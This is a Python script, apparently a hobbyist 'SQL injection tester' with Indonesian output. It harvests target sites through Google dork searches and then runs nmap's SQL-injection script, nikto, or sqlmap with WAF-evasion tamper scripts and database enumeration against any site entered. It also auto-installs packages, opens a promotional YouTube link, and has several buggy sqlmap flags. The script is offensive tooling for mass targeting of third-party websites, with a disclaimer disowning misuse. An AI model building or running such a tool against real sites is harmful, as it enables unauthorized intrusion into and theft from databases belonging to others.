#python 3.7.1
import os
import time
import datetime
from googlesearch import search

class main():
    def get_datetime(self):
        get = datetime.datetime.now().strftime("%d %B %Y")
        return get
    def nmap(self,args):
        get = os.system(f'nmap -p80,443 -sV {args} -A -v --script http-sql-injection.nse ')
        return get
    def sqlmap(self,args):
        menu_tamper = input('do you want to use tamper?(y/n) ')
        if menu_tamper == 'y':
            tamper_list = ["space2comment","randomcomments.py","unionalltounion.py"]
            print("========TAMPER-LIST=========")
            print("|    REKOMENDASI TAMPER    |")
            print("============================")
            for i in range(len(tamper_list)):
                print(f'{i}.{tamper_list[i]}')
            def repeat():
                try:
                    menu = int(input('choose: '))
                    if menu == 0:
                        get = os.system(f'sqlmap -u {args} --tamper={tamper_list[0]} -v 3 --level=3 --risk=2 --dbs --batch')
                        return get
                    elif menu == 1:
                        get = os.system(f'sqlmap -u {args} --tamper={tamper_list[1]} -v 3  --level=3 --risk2 --dbs --batch')
                        return get
                    elif menu == 2:
                        get = os.system(f'sqlmap -u {args} --tamper={tamper_list[2]} -v 3  --level=3 --risk2 --dbs --batch')
                        return get
                    else:
                        print('no choice!!!')
                        return repeat()
                except ValueError:
                    print('invalid character!!')
                    return repeat()
            if __name__=='__main__':
                repeat()
        else:
            get = os.system(f'sqlmap -u {args} -v 3 --dbs --batch')
            return get
    def nikto(self,args):
        dump_dir = input('do you want dump dir site?(y/n) ')
        if dump_dir == 'y':
            get = os.system(f'nikto -h {args} -Cgidirs all -Tuning 9')
            return get
        else:
            get = os.system(f'nikto -h {args} -Tuning 9')
            return get    
    def install(self):
        get = os.system('apt-get install python3 sqlmap nikto nmap -y')
        return get
    def python_module(self):
        get = os.system('pip3 install googlesearch-python')
        return get    
    def sidabutar1337(self):
        try:
            self.install()
            self.python_module()
            print("==========================")
            print("|  SQL INJECTION TESTER  |")
            print("==========================")
            print("|Author:ZeusSec1337      |")
            print("|Github:sidabutar1337    |")
            print("==========================")
            datetime = "indonesian",self.get_datetime()  
            print(datetime)
            print('Author tidak bertanggung jawab atas penyalahgunaan alat hacking')
            print('Semoga harimu menyenangkan peretas!!!')
            print('Bantu dukung saya')
            os.system('xdg-open https://youtu.be/VL-QQwLNvOo?si=1z-GnFQl_n_DUWOX')
            print('Suscribe YouTube saya')
            dork = input('dork: ')
            max_search = int(input('max_search: '))
            for results in search(dork,lang=id,num_results=max_search):
                print(results)
            print('dump link succes!!!')
            print("==================================")
            print("|         TOOLS HACKING          |")
            print("==================================")
            print("|1.Nmap(Scan Vulnerability)      |")
            print("|2.Nikto(Scan Vulnerability)     |")   
            print("|3.Sqlmap(Inject Vulnerability)  |")
            print("==================================")
            def fucking():
                try:
                    menu = int(input('choose: '))
                    if menu == 1:
                        print('harapkan masukan target anda')
                        print('jangan menggunakan parameter dan protocol HTTP/HTTPS')
                        print('example: sitetarget.com')
                        site = input('input site: ')
                        self.nmap(site)
                        time.sleep(0.3)
                    elif menu == 2:
                        print('harap masukan target anda')
                        print('jangan menggunakan parameter')
                        print('example: http://sitetarget.com')
                        site = input('input site: ')
                        self.nikto(site)
                        time.sleep(0.3)
                    elif menu == 3:
                        print('harap masukan target anda')
                        print('harap gunakan parameter')
                        print('example: https://sitetarget.com/news.php?id=1')
                        site = input('input site: ')
                        self.sqlmap(site)
                        time.sleep(0.3)
                    else:
                        print('no choice!!!')
                        return fucking()
                        time.sleep(0.5)
                except ValueError:
                    print('invalid choose!!!')
                    return fucking()
                    time.sleep(0.5)
            if __name__=='__main__':
                fucking()
        except ValueError:
            print('invalid character!!!')
            return self.sidabutar1337()        
if __name__=='__main__':
    start = main()
    start.sidabutar1337()                
    time.sleep(3)
    